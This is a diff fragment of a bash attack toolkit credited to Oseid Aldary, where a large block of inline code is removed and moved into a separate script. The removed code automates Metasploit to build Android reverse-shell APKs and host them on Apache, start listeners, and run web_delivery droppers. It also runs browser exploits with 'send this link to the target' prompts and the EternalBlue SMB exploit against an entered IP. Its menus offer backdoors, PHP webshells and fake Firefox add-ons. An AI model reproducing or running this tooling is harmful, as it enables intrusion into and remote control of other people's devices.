-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [APK] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                            
-echo "$BLUE PAYLOAD    $GREEN:>$RED android/shell/reverse_tcp $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-aa=.apk
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 110x23 -e "msfvenom -p android/shell/reverse_tcp LHOST=$host LPORT=$port -a dalvik --platform Android -f raw > $hh/Desktop/Output/$name$aa"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$aa
-cp $name$aa /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
- xterm -T "DHH - [$name] Listener" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD android/shell/reverse_tcp; exploit -j'"
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-and2s () {
-clear
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-if [ -z $LHOST ];then
-echo
-echo
-echo "$RED[x]$BLUE The error your not Enter anything !! "
-sleep 3
-and2s
-fi
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-if [ -z $port ];then
-echo
-echo
-echo "$RED[x]$BLUE The error your not Enter anything !! "
-sleep 3
-and2s
-fi
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-if [ -z $name ];then
-echo
-echo
-echo "$RED[x]$BLUE The error your not Enter anything !! "
-sleep 3
-and2s
-fi
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [APK] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                            
-echo "$BLUE PAYLOAD    $GREEN:>$RED android/shell/reverse_http $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-aa=.apk
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 110x23 -e "msfvenom -p android/shell/reverse_http LHOST=$host LPORT=$port -a dalvik --platform Android -f raw > $hh/Desktop/Output/$name$aa"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$aa
-cp $name$aa /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
- xterm -T "DHH - [$name] Listener" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD android/shell/reverse_http; exploit -j'"
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-and3s () {
-clear
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-if [ -z $host ];then
-echo
-echo
-echo "$RED[x]$BLUE The error your not Enter anything !! "
-sleep 3
-and3s
-fi
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-if [ -z $port ];then
-echo
-echo
-echo "$RED[x]$BLUE The error your not Enter anything !! "
-sleep 3
-and3s
-fi
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-if [ -z $name ];then
-echo
-echo
-echo "$RED[x]$BLUE The error your not Enter anything !! "
-sleep 3
-and3s
-fi
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [APK] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                          
-echo "$BLUE PAYLOAD    $GREEN:>$RED android/shell/reverse_https $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-aa=.apk
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 110x23 -e "msfvenom -p android/shell/reverse_https LHOST=$host LPORT=$port -a dalvik --platform Android -f raw > $hh/Desktop/Output/$name$aa"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$aa
-cp $name$aa /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
- xterm -T "DHH - [$name] Listener" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD android/shell/reverse_https; exploit -j'"
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-
-
-function android  {
-clear
-
-cat << !
-
-$RED
-                   .___             .__    .___ ___.                  __       .___                    
-_____    ____    __| _/______  ____ |__| __| _/ \_ |__ _____    ____ |  | __ __| _/____   ___________  
-\__  \  /    \  / __ |\_  __ \/  _ \|  |/ __ |   | __ \\__  \ _/ ___\|  |/ // __ |/  _ \ /  _ \_  __ \ 
- / __ \|   |  \/ /_/ | |  | \(  <_> )  / /_/ |   | \_\ \/ __ \\  \___|    </ /_/ (  <_> |  <_> )  | \/ 
-(____  /___|  /\____ | |__|   \____/|__\____ |   |___  (____  /\___  >__|_ \____ |\____/ \____/|__|    
-     \/     \/      \/                      \/       \/     \/     \/     \/    \/                     $BLUE
-
-
-PAYLODS
-======= 
-
-METERPRETER
-============$GREEN
-1 $BLUE > android/meterpreter/reverse_tcp $GREEN
-2 $BLUE > android/meterpreter/reverse_http $GREEN 
-3 $BLUE > android/meterpreter/reverse_https $BLUE
-
-SHELL
-======$GREEN
-4 $BLUE > android/shell/reverse_tcp $GREEN
-5 $BLUE > android/shell/reverse_http $GREEN 
-6 $BLUE > android/shell/reverse_https $GREEN
-
-
-7 $BLUE >$RED EXIT $GREEN
-
-!
-echo "============================================================="$BLUE
-echo
-echo -n "choice payload :> $RED "
-read pylo
-case $pylo in
-1)and1 ;;
-2)and2 ;;
-3)and3 ;;
-4)and1s ;;
-5)and2s ;;
-6)and3s ;;
-7)exie ;;
-*) echo "\"$pylo\":$RED[x]$BLUE The error of your choice does not exist"; sleep 2 ;;
-esac
-android
-}
-
-power () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-if [ -z $host ];then
-echo
-echo
-echo "$RED[x]$BLUE The error your not Enter anything !! "
-sleep 3
-power
-fi
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-if [ -z $port ];then
-echo
-echo
-echo "$RED[x]$BLUE The error your not Enter anything !! "
-sleep 3
-power
-fi
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [web_delivery - [powershell] Final Config:"
-echo "==================================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                                                                    
-echo "$BLUE exploit    $GREEN:>$RED multi/script/web_delivery [powershell] $GREEN "              
-sleep 3
-echo
-echo
-echo $BLUE"[*]$RED:$GREEN create and Listener $RED [$BLUE web_delvery$RED [$BLUE powershell $RED] "
-sleep 2
-echo
-echo
-xterm -T " DHH - Listener [web_delivery powershell payload] " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $host; set TARGET 2; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $host; set LPORT $port; set URIPATH /a; exploit -j'"
-
-echo "Done ! "
-
-}
-
-py () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-if [ -z $host ];then
-echo
-echo
-echo "$RED[x]$BLUE The error your not Enter anything !! "
-sleep 3
-py
-fi
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-if [ -z $port ];then
-echo
-echo
-echo "$RED[x]$BLUE The error your not Enter anything !! "
-sleep 3
-py
-fi
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [web_delivery - [python] Final Config:"
-echo "==================================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                                                                    
-echo "$BLUE exploit    $GREEN:>$RED multi/script/web_delivery [python] $GREEN "              
-sleep 3
-echo
-echo
-echo $BLUE"[*]$RED:$GREEN create and Listener $RED [$BLUE web_delvery$RED [$BLUE python $RED] "
-sleep 2
-echo
-echo
-xterm -T " DHH - Listener [web_delivery python payload] " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $host; set TARGET 0; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $host; set LPORT $port; set URIPATH /a; exploit -j'"
-
-echo "Done ! "
-
-}
-
- 
-
-
-
-
-
-function webdd {
-clear
-
-cat << !
-
-$RED
-
-          _______  ______       ______   _______  _       _________          _______  _______          
-|\     /|(  ____ \(  ___ \     (  __  \ (  ____ \( \      \__   __/|\     /|(  ____ \(  ____ )|\     /|
-| )   ( || (    \/| (   ) )    | (  \  )| (    \/| (         ) (   | )   ( || (    \/| (    )|( \   / )
-| | _ | || (__    | (__/ /     | |   ) || (__    | |         | |   | |   | || (__    | (____)| \ (_) / 
-| |( )| ||  __)   |  __ (      | |   | ||  __)   | |         | |   ( (   ) )|  __)   |     __)  \   /  
-| || || || (      | (  \ \     | |   ) || (      | |         | |    \ \_/ / | (      | (\ (      ) (   
-| () () || (____/\| )___) )    | (__/  )| (____/\| (____/\___) (___  \   /  | (____/\| ) \ \__   | |   
-(_______)(_______/|/ \___/_____(______/ (_______/(_______/\_______/   \_/   (_______/|/   \__/   \_/  $GREEN 
-                         (_____)                                                                       
-
-
-1 $BLUE > powershell for [ exploit windows ] $GREEN
-2 $BLUE > python for [ exploit linux ]$GREEN
-
-3 $BLUE >$RED Exit $GREEN                                                                               
-
-=======================================================
-!
-echo -n "Enter choice{1/2/3 >> : $RED "
-read cho
-case $cho in
-1)power ;;
-2)py ;;
-3)exie ;;
-*) echo "\"$cho\":$RED[x]$BLUE The error of your choice does not exist"; sleep 2 ;;
-esac
-webdd
-
-}
-
-andro1 () {
-clear
-echo
-echo
-echo "please wait.........."
-sleep 2
-clear
-echo $BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo
-echo -n "Enter SRVHOST=$RED"
-read LHOST
-if [ -z $LHOST ];then
-echo
-echo
-echo "$RED[x]$BLUE The error your not Enter anything !! "
-sleep 3
-andro1
-fi
-echo "" $GREEN
-sleep 1
-echo "SRVHOST==>$BLUE $LHOST "$GREEN
-echo
-echo "==========================="
-echo
-echo -n "Enter LPORT=$RED"
-read port
-if [ -z $port ];then
-echo
-echo
-echo "$RED[x]$BLUE The error your not Enter anything !! "
-sleep 3
-andro1
-fi
-echo "" $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port "$GREEN
-echo
-echo "==========================="
-sleep 1
-clear
-echo
-echo
-echo " Final Config: "
-echo "===================================="
-echo "$BLUE SRVHOST    $GREEN:>$RED $LHOST $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                                                                   
-echo "$BLUE exploit    $GREEN:>$RED android/browser/webview_addjavascriptinterface  $GREEN "
-echo
-sleep 4
-echo $BLUE"[*]$RED:$GREEN create $RED [$BLUE exploit android $RED] "
-sleep 2
-echo
-echo "$GREEN Done !"
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo "$BLUE[*]$RED:$GREEN[Send This Link To The Target Android[ http://$LHOST:8080/a ] ]" 
-echo
-sleep 1
-echo "starting Listener  on $BLUE[ http://$LHOST:8080/a ]"
-sleep 1
-xterm -T "DHH - Listenner" -geometry 99x23 -e "msfconsole -x 'use exploit/android/browser/webview_addjavascriptinterface; set PAYLOAD android/meterpreter/reverse_tcp; set SRVHOST $LHOST; set LPORT $port; set LHOST $LHOST; set URIPATH /a; exploit -j'"
-
-echo "Done !"
-sleep 1
-
-}
-
-win1 () {
-clear
-echo
-echo
-echo "please wait.........."
-sleep 2
-clear
-echo $BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo
-echo -n "Enter SRVHOST=$RED"
-read LHOST
-if [ -z $LHOST ];then
-echo
-echo
-echo "$RED[x]$BLUE The error your not Enter anything !! "
-sleep 3
-win1
-fi
-echo "" $GREEN
-sleep 1
-echo "SRVHOST==>$BLUE $LHOST "$GREEN
-echo
-echo "==========================="
-echo
-echo -n "Enter LPORT=$RED"
-read port
-if [ -z $port ];then
-echo
-echo
-echo "$RED[x]$BLUE The error your not Enter anything !! "
-sleep 3
-win1
-fi
-echo "" $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port "$GREEN
-echo
-echo "==========================="
-sleep 1
-clear
-echo
-echo
-echo " Final Config: "
-echo "========================================="
-echo "$BLUE SRVHOST    $GREEN:>$RED $LHOST $GREEN"
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"
-echo "$BLUE exploit    $GREEN:>$RED windows/browser/webdav_dll_hijacker $GREEN"
-sleep 3
-echo
-echo
-echo $BLUE"[*]$RED:$GREEN create $RED [$BLUE exploit windows $RED] "
-sleep 2
-echo
-echo "$GREEN Done !"
-sleep 1
-echo 
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo "$BLUE[*]$RED:$GREEN[Send This Link To The Target Windows[ http://$LHOST:8080/a ] ]" 
-echo
-sleep 1
-echo "starting Listener  on $BLUE[ http://$LHOST:8080/a ]"
-
-xterm -T "DHH - Listener " -geometry 110x23 -e "msfconsole -x 'use exploit/windows/browser/webdav_dll_hijacker; set PYLOAD windows/meterpreter/reverse_tcp; set LHOST $LHOST; set SRVHOST $LHOST; set EXTENSIONS torrent; set LPORT $port; exploit -j'"
-
-echo "Done !"
-sleep 1
-
-}
-
-
-
-explo () {
-clear
-echo
-echo
-echo "please wait.........."
-sleep 2
-clear
-echo $BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo
-echo -n "Enter LHOST=$RED"
-read LHOST
-if [ -z $LHOST ];then
-echo
-echo
-echo "$RED[x]$BLUE The error your not Enter anything !! "
-sleep 3
-winhack
-fi
-echo "" $GREEN
-sleep 1
-echo "LHOST==>$BLUE $LHOST "$GREEN
-echo
-echo "==========================="
-echo
-echo -n "Enter targetIP=$RED"
-read target
-if [ -z $target ];then
-echo
-echo
-echo "$RED[x]$BLUE The error your not Enter anything !! "
-sleep 3
-winhack
-fi
-echo "" $GREEN
-sleep 1
-echo "targetIP==>$BLUE $target "$GREEN
-echo
-echo "==========================="
-sleep 1
-clear
-echo
-echo
-echo " Final Config: [exploit [$target]] "
-echo "========================================="
-echo "$BLUE LHOST      $GREEN:>$RED $LHOST $GREEN"
-echo "$BLUE targetIP   $GREEN:>$RED $target $GREEN"
-echo "$BLUE exploit    $GREEN:>$RED exploit/windows/smb/ms17_010_eternalblue $GREEN"
-sleep 3
-echo
-echo
-echo "$BLUE[*]$RED:$GREEN Starting exploit$RED [$target] "
-sleep 1
-xterm -T "DHH - exploit[$target]" -geometry 110x23 -e "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue ; set LHOST $LHOST; set rhost $target; set PAYLOAD windows/meterpreter/reverse_tcp; exploit -j'"
-echo
-echo "Done!"
-sleep 1
-clear
-otherexploit
-
-}
-
-bac () {
-clear
-otherexploit
-
-}
-
-
-function winhack {
-clear
-echo
-echo
-echo "please wait.........."
-sleep 2
-clear
-echo
-echo "" $GREEN
-echo "============================"
-echo
-echo -n "Enter targetIP=$RED"
-read target
-if [ -z $target ];then
-echo
-echo 
-echo "$RED[x]$BLUE The error your not Enter anything !! "
-sleep 3
-winhack
-fi
-echo "" $GREEN
-sleep 1
-echo "targetIP==>$BLUE $target "$GREEN
-echo
-echo "==========================="
-sleep 1
-clear
-echo
-echo
-echo " Final Config: [scanner $target ] "
-echo "========================================="
-echo "$BLUE targetIP   $GREEN:>$RED $target $GREEN"
-echo "$BLUE exploit    $GREEN:>$RED auxiliary/scanner/smb/smb_ms17_010 $GREEN"
-sleep 3
-echo
-echo
-echo "starting scan target$RED[$target]"
-sleep 1
-xterm -T "DHH -SCANNER [$target]" -geometry 110x23 -e "msfconsole -x 'use auxiliary/scanner/smb/smb_ms17_010; set rhosts $target; exploit -j'"
-echo
-echo "$BLUE[*]$RED:$GREEN Done"
-sleep 1
-clear
-echo
-echo "" $RED
-echo " ##########################################################"
-echo " ################$GREEN   Was the target infected ?$RED #############"
-echo " ##########################################################"$BLUE
-echo $GREEN
-echo "if target infected choice 1 to $BLUE run exploit "$GREEN
-echo
-echo "if target not infected choice 2 to $BLUE back to menu"$GREEN
-echo "======================================================== "$BLUE
-echo " 1 -$RED run exploit "$BLUE
-echo ""
-echo " 2 -$RED back to menu "
-echo ""$GREEN 
-echo -n "ENTER YOUR CHOICE [1/2] : $RED"
-read coi
-case $coi in
-1)explo ;;
-2)bac ;;
-*) echo "\"$coi\":$RED[x]$BLUE The error of your choice does not exist"; sleep 2 ;;
-esac
-winhack
-
-}
-
-
-
-function otherexploit {
-clear
-cat << !
-$RED
-╔═╗┌┬┐┬ ┬┌─┐┬─┐  ┌─┐─┐ ┬┌─┐┬  ┌─┐┬┌┬┐
-║ ║ │ ├─┤├┤ ├┬┘  ├┤ ┌┴┬┘├─┘│  │ ││ │ 
-╚═╝ ┴ ┴ ┴└─┘┴└─  └─┘┴ └─┴  ┴─┘└─┘┴ ┴ 
-
-$GREEN
-        
-1 $BLUE >[Hack android use link] $GREEN
-2 $BLUE >[Hack windows use torrent file] $GREEN
-3 $BLUE >[Check the Windows operating system target of the MS_17 [Eternabalu]$GREEN
-
-4 $BLUE >$RED EXIT$GREEN   
- 
-!
-echo "============================================"
-echo
-echo -n "Enter Choice >> : $RED "
-read other
-case $other in
-1)andro1 ;;
-2)win1 ;;
-3)winhack ;;
-4)exie ;;
-*) echo "\"$other\":$RED[x]$BLUE The error of your choice does not exist"; sleep 2 ;;
-esac
-otherexploit
-
-}
-
-
-trap ctrl_c INT
-ctrl_c() {
-exie
-}
- 
-
-
-exie () {
-echo
-echo "" $GREEN
-echo "thanks for using"
-sleep 2
-echo "" $RED
-echo "see you letar"
-sleep 2
-echo
-echo "" $BLUE
-echo "goodbye :) "
-sleep 2
-clear
-exit
-
-}
-
-
-while :
-do
-clear
-cat << !
-
-$GREEN
-------------------------------------------------------------------------$RED|
-                                                                        |
-╔═╗─┐ ┬┌─┐┬  ┌─┐┬┌┬┐┌─┐┌┬┐┬┌─┐┌┐┌  ┌─┐┬  ┌─┐┌┬┐┌─┐┌─┬─┐┌┬┐              |
-║╣ ┌┴┬┘├─┘│  │ ││ │ ├─┤ │ ││ ││││  ├─┘│  ├─┤ │ ├┤ │ │├┬┘│││             |
-╚═╝┴ └─┴  ┴─┘└─┘┴ ┴ ┴ ┴ ┴ ┴└─┘┘└┘  ┴  ┴─┘┴ ┴ ┴ └  └─┘┴└─┴ ┴             |$BLUE  
-                                                                   $RED     |$BLUE
-by --->$GREEN Oseid Aldary$BLUE <----$RED                                              |
-                                                                        |
-There is no safe system :)$RED                                              |$GREEN
-                                                                        $RED|$GREEN
--------------------------Automated Exploits-----------------------------$RED|$BLUE
-$BLUE                                                                       $RED |$BLUE 
-  1 =>>    Windows Payloads     >>      [ Windows Payloads Menu        ]$RED|$BLUE
-  2 =>>    Linux Payloads       >>      [ Linux Payloads Menu          ]$RED|$BLUE
-  3 =>>    Mac osx Payload      >>      [ Apple-Mac Payload            ]$RED|$BLUE
-  4 =>>    Android Backdoors    >>      [ Android Backdoors Menu       ]$RED|$BLUE
-  5 =>>    Java Signed Applet   >>      [ Multi-Operative Systems      ]$RED|$BLUE
-  6 =>>    Webshell[php]        >>      [ Website Backdoor Shell       ]$RED|$BLUE
-  7 =>>    Winrar Backdoor      >>      [ Inject Payload Into a Winrar ]$RED|$BLUE
-  8 =>>    Firefox Addition     >>      [ Fake Firefox Addition        ]$RED|$BLUE
-  9 =>>    Web_Driveby          >>      [ Powershell/ ro /Pythhon      ]$RED|$BLUE
- 10 =>>    other exploit        >>      [ Android // Windows           ]$RED|$BLUE
-                                                                        $RED|
-                            ____________________________________________|
- $GREEN                           $RED|$BLUE[*]$RED:$BLUE[Public IP ADDR: $GREEN$myip2$BLUE ]$GREEN                   
-                            $RED|$BLUE[*]$RED:$BLUE[Local IP ADDR : $GREEN$myip$BLUE ]             
- E =>>   Exit               $RED|$BLUE[*]$RED:$BLUE[Interface Use : $GREEN$In$BLUE ]          
-                            $RED|$BLUE[*]$RED:$BLUE[Gateway: $GREEN$GAT$BLUE ]$RED
-____________________________|                        
-!
-echo
-echo "" $RED
-echo -n "[>]$GREEN:[Enter Your Choice$BLUE ->>> "$RED
-read word
-case $word in
-1)wine ;;
-2)linu ;;
-3)mac ;;
-4)android ;;
-5)java ;;
-6)web ;;
-7)wiri ;;
-8)fireadd ;;
-9)webdd ;;
-10)otherexploit ;;
-e)exie ;;
-E)exie ;;
-*) echo "\"$word\":$RED[x]$BLUE The error of your choice does not exist"; sleep 2 ;;
-esac
-done
-
+chmod +x Exploitation-platform.sh
+./Exploitation-platform.sh
 else
 if [ $word = 19 ];then
 clear 
@@ -13123,7 +8677,7 @@ echo $GREEN"[!]you not connect to the internet ! "$BLUE
 echo
 echo "[!]please Connect to the internet and try again :) " 
 echo
-exit
+exit 0
 fi
 echo
 echo "$BLUE[*] $GREEN[ CONNECT ]"
@@ -13232,4 +8786,15 @@ fi
 fi
 fi
 fi
-exit 
+exit 0
+
+
+##############################################################
+##################### 		     #########################
+#####################   END OF TOOL  #########################
+#####################                #########################
+##############################################################
+#This TOOL by Oseid Aldary
+#Have a nice day :)
+#GoodBye
+ 
